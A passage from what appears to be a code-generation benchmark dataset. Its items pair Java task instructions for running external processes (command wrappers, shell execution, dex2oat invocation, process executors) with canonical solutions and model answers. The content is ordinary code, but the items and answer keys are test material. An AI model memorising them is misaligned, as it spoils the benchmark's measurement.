{\n        private final byte[] data;\n        private final int size;\n\n        public Packet(byte[] data, int size) {\n            this.data = data;\n            this.size = size;\n        }\n\n        public int size() {\n            return size;\n        }\n    }\n\n    interface Consumer<T> {\n        void accept(T t);\n    }\n\n    static class ExecutionException extends Exception {\n        public ExecutionException(String message) {\n            super(message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Java class that facilitates interaction with external processes through command execution, providing methods for writing input, executing commands, and retrieving results, with support for timeout handling and resource cleanup.\n\nClass Description: The Command class encapsulates functionality for executing and interacting with external processes. It handles process creation, input/output stream management, command execution, and result collection, with features for line-based input, process termination, and timeout control.\n\nAttributes:\n\nprocess: [Process] - The running external process instance\nstdIn: [OutputStream] - Stream for writing input to the process\nstdOut: [File] - Temporary file storing the process's standard output\nstdErr: [File] - Temporary file storing the process's error output\nnextLine: [String] - Line separator string for command input\nexit: [String] - Command string to terminate the process\ncharset: [Charset] - Character encoding for input/output\nstartTime: [LocalDateTime] - Timestamp when the process was started\n\nMethods:\n\nof: [of(String init)] -> [Command] - Creates a Command instance with default settings\nof: [of(String init, Charset charset)] -> [Command] - Creates a Command instance with specified charset\nof: [of(String init, String nextLine, String exit, Charset charset)] -> [Command] - Creates a Command instance with custom settings\nwrite: [write(String str)] -> [Command] - Writes a string to the process's input stream\nline: [line()] -> [Command] - Writes a line separator to the process's input stream\nexit: [exit()] -> [Command] - Sends the exit command to terminate the process\nexec: [exec(String str)] -> [Command] - Executes a command string (writes input and adds line separator)\nresult: [result()] -> [CommandResult] - Waits for process completion and returns results\nresult: [result(long millis)] -> [CommandResult] - Waits with timeout for process completion\nclose: [close()] -> [void] - Terminates the process and releases resources",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.nio.charset.Charset;\nimport java.time.LocalDateTime;\nimport java.util.StringTokenizer;\nimport java.util.concurrent.TimeUnit;\n\npublic final class Command {\n\n    public static final String NEXT_LINE = SystemUtils.lineSeparator();\n    public static final String EXIT_COMMAND = \"exit\";\n\n    private final Process process;\n    private final OutputStream stdIn;\n    private final File stdOut;\n    private final File stdErr;\n    private final String nextLine;\n    private final String exit;\n    private final Charset charset;\n    private final LocalDateTime startTime;\n\n    private Command(String init, String nextLine, String exit, Charset charset) throws IOException {\n        if (!StringUtils.hasText(init)) {\n            throw new IllegalArgumentException(\"Empty init\");\n        }\n        StringTokenizer st = new StringTokenizer(init);\n        String[] cmdArray = new String[st.countTokens()];\n        for (int i = 0; st.hasMoreTokens(); i++) {\n            cmdArray[i] = st.nextToken();\n        }\n\n        this.stdOut = FileUtils.createTemp();\n        this.stdErr = FileUtils.createTemp();\n\n        ProcessBuilder builder = new ProcessBuilder(cmdArray).redirectError(this.stdErr).redirectOutput(this.stdOut);\n        this.process = builder.start();\n        this.stdIn = this.process.getOutputStream();\n        this.nextLine = nextLine;\n        this.exit = exit;\n        this.charset = charset;\n        this.startTime = LocalDateTime.now();\n    }\n\n    public static Command of(String init) throws IOException {\n        return of(init, SystemUtils.charset());\n    }\n\n    public static Command of(String init, Charset charset) throws IOException {\n        return of(init, NEXT_LINE, EXIT_COMMAND, charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) throws IOException {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    public Command write(String str) throws IOException {\n        this.stdIn.write(str.getBytes(this.charset));\n        this.stdIn.flush();\n        return this;\n    }\n\n    public Command line() throws IOException {\n        return write(this.nextLine);\n    }\n\n    public Command exit() throws IOException {\n        write(this.exit);\n        return line();\n    }\n\n    public Command exec(String str) throws IOException {\n        write(str);\n        return line();\n    }\n\n    public CommandResult result() throws InterruptedException {\n        this.process.waitFor();\n        return CommandResult.of(this.stdOut, this.stdErr, this.startTime, LocalDateTime.now(), this.charset);\n    }\n\n    public CommandResult result(long millis) throws InterruptedException, CommandTimeoutException {\n        if (this.process.waitFor(millis, TimeUnit.MILLISECONDS)) {\n            return result();\n        }\n        this.process.destroyForcibly();\n        throw new CommandTimeoutException();\n    }\n\n    public void close() {\n        this.process.destroy();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.charset.Charset;\nimport java.nio.file.Files;\nimport java.time.LocalDateTime;\n\npublic class Command implements AutoCloseable {\n    protected Process process;\n    protected OutputStream stdIn;\n    protected File stdOut;\n    protected File stdErr;\n    protected String nextLine;\n    protected String exit;\n    protected Charset charset;\n    protected LocalDateTime startTime;\n\n    public static Command of(String init) {\n        return new Command(init, \"\\n\", \"exit\", Charset.defaultCharset());\n    }\n\n    public static Command of(String init, Charset charset) {\n        return new Command(init, \"\\n\", \"exit\", charset);\n    }\n\n    public static Command of(String init, String nextLine, String exit, Charset charset) {\n        return new Command(init, nextLine, exit, charset);\n    }\n\n    private Command(String init, String nextLine, String exit, Charset charset) {\n        this.nextLine = nextLine;\n        this.exit = exit;\n        this.charset = charset;\n        try {\n            stdOut = File.createTempFile(\"cmd_out_\", \".tmp\");\n            stdErr = File.createTempFile(\"cmd_err_\", \".tmp\");\n            ProcessBuilder pb = new ProcessBuilder(init.split(\"\\\\s+\"));\n            pb.redirectOutput(stdOut);\n            pb.redirectError(stdErr);\n            process = pb.start();\n            stdIn = process.getOutputStream();\n            startTime = LocalDateTime.now();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Command write(String str) {\n        try {\n            stdIn.write(str.getBytes(charset));\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        return this;\n    }\n\n    public Command line() {\n        return write(nextLine);\n    }\n\n    public Command exit() {\n        return write(exit + nextLine);\n    }\n\n    public Command exec(String str) {\n        return write(str + nextLine);\n    }\n\n    public CommandResult result() {\n        return result(0);\n    }\n\n    public CommandResult result(long millis) {\n        try {\n            if (millis > 0) {\n                if (!process.waitFor(millis, java.util.concurrent.TimeUnit.MILLISECONDS)) {\n                    process.destroyForcibly();\n                    return new CommandResult(-1, \"\", \"\", true);\n                }\n            } else {\n                process.waitFor();\n            }\n            String out = new String(Files.readAllBytes(stdOut.toPath()), charset);\n            String err = new String(Files.readAllBytes(stdErr.toPath()), charset);\n            int exitCode = process.exitValue();\n            return new CommandResult(exitCode, out, err, false);\n        } catch (IOException | InterruptedException e) {\n            return new CommandResult(-1, \"\", e.getMessage(), true);\n        } finally {\n            close();\n        }\n    }\n\n    public void close() {\n        try {\n            stdIn.close();\n            process.destroy();\n            stdOut.delete();\n            stdErr.delete();\n        } catch (Exception ignored) {\n        }\n    }\n\n    public static class CommandResult {\n        public final int exitCode;\n        public final String stdout;\n        public final String stderr;\n        public final boolean error;\n\n        public CommandResult(int exitCode, String stdout, String stderr, boolean error) {\n            this.exitCode = exitCode;\n            this.stdout = stdout;\n            this.stderr = stderr;\n            this.error = error;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Create utility functions for working with FileChannel in Java NIO to provide OutputStream functionality with optional force-write capability at close.\n\nFunction Description: The provided code consists of three utility functions that work together to create an OutputStream wrapper around a FileChannel, with control over whether changes are forcibly written to disk when closing the stream.\n\nInput:\n1. For newOutputStream:\n   - channel: FileChannel - The FileChannel to wrap with OutputStream functionality\n   - forceAtClose: boolean - Whether to force write changes to disk when closing\n\n2. For newOutputStreamForceAtClose:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\n3. For newFileChannel:\n   - p: Path - The file path to open\n   - options: OpenOption... - Variable arguments of file open options\n\nOutput:\n1. For newOutputStream: OutputStream - A new OutputStream instance that writes to the provided FileChannel\n2. For newOutputStreamForceAtClose: OutputStream - A new OutputStream instance that forces writes to disk when closed\n3. For newFileChannel: FileChannel - A new FileChannel instance for the specified path with given options",
    "Canonical_solution": "import java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.io.OutputStream;\nimport java.io.IOException;\n\nstatic OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n    final byte[] single = {0};\n    return new OutputStream() {\n        @Override\n        public void write(int b) throws IOException {\n            single[0] = (byte) b;\n            write(single);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            for(; len > 0; ) {\n                final int written = channel.write(ByteBuffer.wrap(b, off, len));\n                off += written;\n                len -= written;\n            }\n        }\n\n        @Override\n        public void close() throws IOException {\n            try (FileChannel c = channel) {\n                if (forceAtClose) {\n                    c.force(true);\n                }\n            }\n        }\n    };\n}\n\nstatic OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n    return newOutputStream(newFileChannel(p, options), true);\n}\n\nstatic FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n    return LogUtils.supplyAndLog(LOG,\n        () -> FileChannel.open(p, options),\n        () -> \"FileChannel.open \" + p + \" with options \" + Arrays.asList(options));\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.OutputStream;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.OpenOption;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.file.Files;\n\npublic class FileChannelOutputStreamUtils {\n\n    public static OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n        return new OutputStream() {\n            private final ByteBuffer buffer = ByteBuffer.allocate(8192);\n            private final byte[] singleByte = new byte[1];\n\n            @Override\n            public void write(int b) throws IOException {\n                singleByte[0] = (byte) b;\n                write(singleByte, 0, 1);\n            }\n\n            @Override\n            public void write(byte[] b, int off, int len) throws IOException {\n                if (len == 0) return;\n                while (len > 0) {\n                    int space = buffer.remaining();\n                    if (space == 0) {\n                        buffer.flip();\n                        channel.write(buffer);\n                        buffer.clear();\n                        space = buffer.remaining();\n                    }\n                    int copyLen = Math.min(len, space);\n                    buffer.put(b, off, copyLen);\n                    off += copyLen;\n                    len -= copyLen;\n                }\n            }\n\n            @Override\n            public void flush() throws IOException {\n                buffer.flip();\n                if (buffer.hasRemaining()) {\n                    channel.write(buffer);\n                    buffer.compact();\n                }\n            }\n\n            @Override\n            public void close() throws IOException {\n                flush();\n                if (forceAtClose) {\n                    channel.force(true);\n                }\n                channel.close();\n            }\n        };\n    }\n\n    public static OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n        FileChannel channel = newFileChannel(p, options);\n        return newOutputStream(channel, true);\n    }\n\n    public static FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n        return FileChannel.open(p, options);\n    }\n}\n```"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a Java class that executes shell commands, handling both simple commands and those requiring shell interpretation (with wildcards or special characters). The class should manage process execution, input/output streams, and error handling.\n\nClass Description: ShellCommand is a concrete implementation of AbstractCommand that executes shell commands either directly or through a shell interpreter when needed. It handles command tokenization, process building, and execution status reporting.\n\nAttributes:\n- command: String - The raw shell command to be executed\n- argv: List<String> - The tokenized command arguments, potentially including shell interpreter when needed\n- shellWildcardPattern: Pattern - Compiled regex pattern to detect shell special characters\n\nMethods:\n- ShellCommand(String command) -> None - Constructor that initializes the command and determines if shell interpretation is needed\n- hasWildcard(String command) -> boolean - Checks if the command contains shell wildcard characters that require interpretation\n- tokenize(String s) -> List<String> - Splits a command string into individual tokens for process execution\n- doExecute(ConcurrentTestCommandExecutor executor) -> None - Executes the command using ProcessBuilder, handles I/O streams, and reports execution status",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.Reader;\nimport java.io.Writer;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\nprivate final Pattern shellWildcardPattern = Pattern.compile(\"[*?$|<>&]\");\n\nstatic int runAppProcess(\n    ProcessBuilder pb,\n    Logger logger,\n    Reader appInput,\n    Writer appOutput) throws IOException, InterruptedException {\n  pb.redirectErrorStream(true);\n  if (logger != null) {\n    logger.info(\"start process: \" + pb.command());\n  }\n  Process p = pb.start();\n\n  if (appInput != null) {\n    OutputStream out =\n        new BufferedOutputStream(\n            p.getOutputStream(),\n            100 * 1024);\n    int c;\n    while ((c = appInput.read()) != -1) {\n      out.write(c);\n    }\n    out.flush();\n  }\n  if (appOutput != null) {\n    InputStream in =\n        new BufferedInputStream(\n            p.getInputStream(),\n            100 * 1024);\n    int c;\n    while ((c = in.read()) != -1) {\n      appOutput.write(c);\n    }\n    appOutput.flush();\n    in.close();\n  }\n  p.waitFor();\n\n  int status = p.exitValue();\n  if (logger != null) {\n    logger.info(\"exit status=\" + status + \" from \" + pb.command());\n  }\n  return status;\n}\n\nprivate class ShellCommand extends AbstractCommand {\n  private final String command;\n  private List<String> argv;\n\n  private ShellCommand(String command) {\n    this.command = command;\n    boolean needShell = hasWildcard(command);\n    if (needShell) {\n      argv = new ArrayList<>();\n      argv.add(\"/bin/sh\");\n      argv.add(\"-c\");\n      argv.add(command);\n    } else {\n      argv = tokenize(command);\n    }\n  }\n\n  private boolean hasWildcard(String command) {\n    return shellWildcardPattern.matcher(command).find();\n  }\n\n  private List<String> tokenize(String s) {\n    List<String> result = new ArrayList<>();\n    StringTokenizer tokenizer = new StringTokenizer(s);\n    while (tokenizer.hasMoreTokens()) {\n      result.add(tokenizer.nextToken());\n    }\n    return result;\n  }\n\n  protected void doExecute(ConcurrentTestCommandExecutor executor) {\n    Integer threadId = executor.getThreadId();\n    storeMessage(threadId, command);\n\n    ProcessBuilder pb = new ProcessBuilder(argv);\n    pb.directory(scriptDirectory);\n    try {\n      int status = runAppProcess(pb, null, null, getThreadWriter(threadId));\n      if (status != 0) {\n        storeMessage(threadId,\n            \"command \" + command + \": exited with status \" + status);\n      }\n    } catch (Exception e) {\n      storeMessage(threadId,\n          \"command \" + command + \": failed with exception \" + e.getMessage());\n    }\n  }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.regex.Pattern;\n\npublic class ShellCommand extends AbstractCommand {\n    private final String command;\n    private final List<String> argv;\n    private final Pattern shellWildcardPattern = Pattern.compile(\"[*?{}|$`~<>]\");\n\n    public ShellCommand(String command) {\n        this.command = command;\n        if (hasWildcard(command)) {\n            this.argv = tokenizeWithShellInterpretation(command);\n        } else {\n            this.argv = tokenize(command);\n        }\n    }\n\n    private boolean hasWildcard(String command) {\n        return shellWildcardPattern.matcher(command).find();\n    }\n\n    private List<String> tokenize(String s) {\n        List<String> tokens = new ArrayList<>();\n        StringBuilder token = new StringBuilder();\n        boolean inQuote = false;\n        for (int i = 0; i < s.length(); i++) {\n            char c = s.charAt(i);\n            if (c == '\"') {\n                inQuote = !inQuote;\n            } else if (!inQuote && Character.isWhitespace(c)) {\n                if (token.length() > 0) {\n                    tokens.add(token.toString());\n                    token = new StringBuilder();\n                }\n            } else {\n                token.append(c);\n            }\n        }\n        if (token.length() > 0) {\n            tokens.add(token.toString());\n        }\n        return tokens;\n    }\n\n    private List<String> tokenizeWithShellInterpretation(String command) {\n        List<String> result = new ArrayList<>();\n        result.add(\"/bin/sh\");\n        result.add(\"-c\");\n        result.add(command);\n        return result;\n    }\n\n    @Override\n    public void doExecute(ConcurrentTestCommandExecutor executor) {\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(argv);\n            Process process = processBuilder.start();\n\n            Thread outputThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        executor.onOutput(line);\n                    }\n                } catch (IOException e) {\n                    executor.onError(\"Error reading command output: \" + e.getMessage());\n                }\n            });\n\n            Thread errorThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        executor.onError(line);\n                    }\n                } catch (IOException e) {\n                    executor.onError(\"Error reading command error stream: \" + e.getMessage());\n                }\n            });\n\n            outputThread.start();\n            errorThread.start();\n\n            int exitCode = process.waitFor();\n            outputThread.join();\n            errorThread.join();\n\n            if (exitCode == 0) {\n                executor.onSuccess(\"Command executed successfully.\");\n            } else {\n                executor.onError(\"Command failed with exit code: \" + exitCode);\n            }\n        } catch (IOException | InterruptedException e) {\n            executor.onError(\"Command execution failed: \" + e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 284,
    "Instruction": "Task Description: Create a Java class that facilitates the conversion of DEX files to OAT files using the Android dex2oat tool, handling process execution and stream management.\n\nClass Description: InterpretDex2OatHelper is a utility class that provides functionality to convert Android DEX files to OAT files by invoking the system's dex2oat tool. It handles process creation, stream consumption, and error checking during the conversion process.\n\nAttributes:\n- STREAM_CONSUMER: [Executor] - A single-thread executor used for consuming process output streams asynchronously.\n\nMethods:\n- getCurrentInstructionSet: () -> [String] - Retrieves the current instruction set architecture of the device using reflection.\n- interpretDex2Oat: (String dexFilePath, String oatFilePath) -> [void] - Main method that executes the dex2oat conversion process with appropriate parameters.\n- consumeInputStream: (InputStream is) -> [void] - Helper method that asynchronously consumes an input stream to prevent process blocking.\n\nMethod Details:\n1. getCurrentInstructionSet:\n   - Input: None\n   - Output: String representing the current instruction set\n   - Description: Uses reflection to call VMRuntime.getCurrentInstructionSet()\n\n2. interpretDex2Oat:\n   - Input: \n     - dexFilePath: String - Path to the input DEX file\n     - oatFilePath: String - Path for the output OAT file\n   - Output: void (throws IOException on failure)\n   - Description: \n     - Prepares the dex2oat command with version-specific parameters\n     - Creates and manages the conversion process\n     - Handles stream consumption and process termination\n\n3. consumeInputStream:\n   - Input: \n     - is: InputStream - Stream to be consumed\n   - Output: void\n   - Description: Asynchronously reads and discards stream contents to prevent blocking",
    "Canonical_solution": "import android.os.Build;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\n\npublic class InterpretDex2OatHelper {\n\n    private static String getCurrentInstructionSet() throws Exception {\n        Class<?> clazz = Class.forName(\"dalvik.system.VMRuntime\");\n        Method currentGet = clazz.getDeclaredMethod(\"getCurrentInstructionSet\");\n        return (String) currentGet.invoke(null);\n    }\n\n    public static void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String targetISA = null;\n        try {\n            targetISA = getCurrentInstructionSet();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        final File oatFile = new File(oatFilePath);\n        if (!oatFile.exists()) {\n            oatFile.getParentFile().mkdirs();\n        }\n\n        final List<String> commandAndParams = new ArrayList<>();\n        commandAndParams.add(\"dex2oat\");\n\n        if (Build.VERSION.SDK_INT >= 24) {\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"-classpath\");\n            commandAndParams.add(\"--runtime-arg\");\n            commandAndParams.add(\"&\");\n        }\n        commandAndParams.add(\"--dex-file=\" + dexFilePath);\n        commandAndParams.add(\"--oat-file=\" + oatFilePath);\n        commandAndParams.add(\"--instruction-set=\" + targetISA);\n\n        if (Build.VERSION.SDK_INT > 25) {\n            commandAndParams.add(\"--compiler-filter=quicken\");\n        } else {\n            commandAndParams.add(\"--compiler-filter=interpret-only\");\n        }\n\n        final ProcessBuilder pb = new ProcessBuilder(commandAndParams);\n        pb.redirectErrorStream(true);\n        final Process dex2oatProcess = pb.start();\n\n        StreamConsumer.consumeInputStream(dex2oatProcess.getInputStream());\n        StreamConsumer.consumeInputStream(dex2oatProcess.getErrorStream());\n\n        try {\n            final int ret = dex2oatProcess.waitFor();\n            if (ret != 0) {\n                throw new IOException(\"dex2oat works unsuccessfully, exit code: \" + ret);\n            }\n        } catch (InterruptedException e) {\n            throw new IOException(\"dex2oat is interrupted, msg: \" + e.getMessage(), e);\n        }\n    }\n\n    private static class StreamConsumer {\n        static final Executor STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n        static void consumeInputStream(final InputStream is) {\n            STREAM_CONSUMER.execute(new Runnable() {\n                @Override\n                public void run() {\n                    if (is == null) {\n                        return;\n                    }\n                    final byte[] buffer = new byte[256];\n                    try {\n                        while ((is.read(buffer)) > 0) {\n                            // To satisfy checkstyle rules.\n                        }\n                    } catch (IOException ignored) {\n                        // Ignored.\n                    } finally {\n                        try {\n                            is.close();\n                        } catch (Exception ignored) {\n                            // Ignored.\n                        }\n                    }\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.Method;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class InterpretDex2OatHelper {\n    private static final ExecutorService STREAM_CONSUMER = Executors.newSingleThreadExecutor();\n\n    public static String getCurrentInstructionSet() throws RuntimeException {\n        try {\n            Class<?> vmRuntimeClass = Class.forName(\"dalvik.system.VMRuntime\");\n            Method getRuntimeMethod = vmRuntimeClass.getMethod(\"getRuntime\");\n            Object runtime = getRuntimeMethod.invoke(null);\n            Method currentInstructionSetMethod = vmRuntimeClass.getMethod(\"getCurrentInstructionSet\");\n            return (String) currentInstructionSetMethod.invoke(runtime);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to get instruction set\", e);\n        }\n    }\n\n    public static void interpretDex2Oat(String dexFilePath, String oatFilePath) throws IOException {\n        String instructionSet = getCurrentInstructionSet();\n        String[] command = {\n                \"dex2oat\",\n                \"--dex-file=\" + dexFilePath,\n                \"--oat-file=\" + oatFilePath,\n                \"--instruction-set=\" + instructionSet\n        };\n\n        ProcessBuilder processBuilder = new ProcessBuilder(command);\n        Process process = processBuilder.start();\n\n        consumeInputStream(process.getInputStream());\n        consumeInputStream(process.getErrorStream());\n\n        try {\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                throw new IOException(\"dex2oat failed with exit code: \" + exitCode);\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new IOException(\"Process was interrupted\", e);\n        }\n    }\n\n    private static void consumeInputStream(InputStream is) {\n        STREAM_CONSUMER.submit(() -> {\n            byte[] buffer = new byte[1024];\n            try {\n                while (is.read(buffer) != -1) {\n                    // Discard the stream content\n                }\n            } catch (IOException ignored) {\n            }\n            return null;\n        });\n    }\n}\n```"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Implement a utility class for executing external processes synchronously and asynchronously in Java, handling input/output streams properly to prevent deadlocks, and collecting process output.\n\nClass Description: A ProcessExecutor utility class that provides methods to run external processes either synchronously (blocking until completion) or asynchronously (returning immediately), while properly managing process streams and errors.\n\nMethods:\n\nMethod1: runWith(List<String> cmd) -> Collection<String> - Executes a command synchronously and returns its output as a collection of strings. Handles both stdout and stderr streams by draining them concurrently to prevent deadlocks. The method blocks until the process completes.\n\nMethod2: runAsync(String... cmd) -> Process - Executes a command asynchronously and returns the Process object immediately without waiting for completion. The caller is responsible for handling the process streams and termination.\n\nMethod3: InputStreamDrainer(InputStream, OutputStream) -> void - [Internal helper class] A thread class that continuously reads from an input stream and writes to an output stream until EOF is reached. Used internally by runWith() to drain process streams.",
    "Canonical_solution": "import java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic static Collection<String> runWith(List<String> cmd) {\n    Collection<String> messages = new ArrayList<>();\n    try {\n        Process p = new ProcessBuilder(cmd).start();\n\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n\n        // drain streams, else we might lock up\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), baos);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), baos);\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int err = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        messages.add(baos.toString());\n    } catch (IOException ex) {\n        return Collections.singleton(ex.getMessage());\n    } catch (InterruptedException ex) {\n        throw new IllegalStateException(ex);\n    }\n    return messages;\n}\n\npublic static Process runAsync(String... cmd) {\n    try {\n        return new ProcessBuilder(cmd).start();\n    } catch (IOException ex) {\n        throw new IllegalStateException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class ProcessExecutor {\n    public Collection<String> runWith(List<String> cmd) throws IOException, InterruptedException, ExecutionException {\n        ProcessBuilder processBuilder = new ProcessBuilder(cmd);\n        Process process = processBuilder.start();\n\n        ExecutorService executor = Executors.newFixedThreadPool(2);\n\n        Future<List<String>> stdoutFuture = executor.submit(new StreamHandler(process.getInputStream()));\n        Future<List<String>> stderrFuture = executor.submit(new StreamHandler(process.getErrorStream()));\n\n        int exitCode = process.waitFor();\n        List<String> stdoutLines = stdoutFuture.get();\n        List<String> stderrLines = stderrFuture.get();\n\n        executor.shutdownNow();\n\n        List<String> result = new ArrayList<>();\n        result.addAll(stdoutLines);\n        result.addAll(stderrLines);\n\n        return result;\n    }\n\n    public Process runAsync(String... cmd) throws IOException {\n        ProcessBuilder processBuilder = new ProcessBuilder(Arrays.asList(cmd));\n        Process process = processBuilder.start();\n        return process;\n    }\n\n    private static class StreamHandler implements Callable<List<String>> {\n        private final InputStream inputStream;\n\n        public StreamHandler(InputStream inputStream) {\n            this.inputStream = inputStream;\n        }\n\n        @Override\n        public List<String> call() throws Exception {\n            List<String> lines = new ArrayList<>();\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    lines.add(line);\n                }\n            }\n            return lines;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Create a Java class that manages the execution of external processes, handles their input/output streams, and provides mechanisms for process termination and output handling through callbacks.\n\nClass Description: The ProcessExecutor class is responsible for executing external processes using ProcessBuilder, managing their lifecycle, and providing real-time output handling through a callback interface. It uses a thread pool for asynchronous execution and includes methods for graceful termination.\n\nAttributes:\n- mProcessBuilder: ProcessBuilder - Configures and manages the external process to be executed\n- mProcess: Process - Represents the currently running external process instance\n- mExecutor: ThreadPoolExecutor - Manages the thread used for asynchronous process execution\n\nMethods:\n- ProcessExecutor(Path scriptPath, Path libraryPath) -> void - Constructor that initializes the ProcessBuilder with the given script and library paths\n- execute(ProcessOutputHandler outputHandler) -> void - Starts the external process asynchronously and handles its output through the provided callback interface\n- terminate() -> void - Terminates the running process and shuts down the executor service\n- interface ProcessOutputHandler - Callback interface for handling process output, completion, and errors\n  - handleOutput(String output) -> void - Called for each line of output from the process\n  - handleCompletion(int exitCode) -> void - Called when the process completes with its exit code\n  - handleError(String errorMessage) -> void - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.file.Path;\nimport java.util.concurrent.ThreadPoolExecutor;\n\npublic class ProcessExecutor {\n\n    private ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder();\n        mProcessBuilder.command(scriptPath.toString(), libraryPath.toString());\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor = ThreadPool.CACHED;\n        mExecutor.execute(() -> {\n            try {\n                mProcess = mProcessBuilder.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    outputHandler.handleOutput(line);\n                }\n\n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch(InterruptedException ie) {\n                outputHandler.handleError(\"Process was interrupted\");\n            } catch(IOException ioe) {\n                outputHandler.handleError(\"IO Error during process execution\");\n            }\n        });\n    }\n\n    public void terminate() {\n        if(mProcess != null) {\n            mProcess.destroy();\n        }\n        if(mExecutor != null) {\n            mExecutor.shutdownNow();\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.file.Path;\nimport java.util.concurrent.*;\n\npublic class ProcessExecutor {\n    private final ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private final ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder(\"java\", \"-Djava.library.path=\" + libraryPath.toString(), \"-jar\", scriptPath.toString());\n        mProcessBuilder.redirectErrorStream(true);\n        mExecutor = (ThreadPoolExecutor) Executors.newSingleThreadExecutor();\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor.submit(() -> {\n            try {\n                mProcess = mProcessBuilder.start();\n\n                BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    outputHandler.handleOutput(line);\n                }\n\n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch (IOException | InterruptedException e) {\n                outputHandler.handleError(e.getMessage());\n                Thread.currentThread().interrupt();\n            }\n        });\n    }\n\n    public void terminate() {\n        if (mProcess != null && mProcess.isAlive()) {\n            mProcess.destroyForcibly();\n        }\n        mExecutor.shutdownNow();\n    }\n\n    public interface 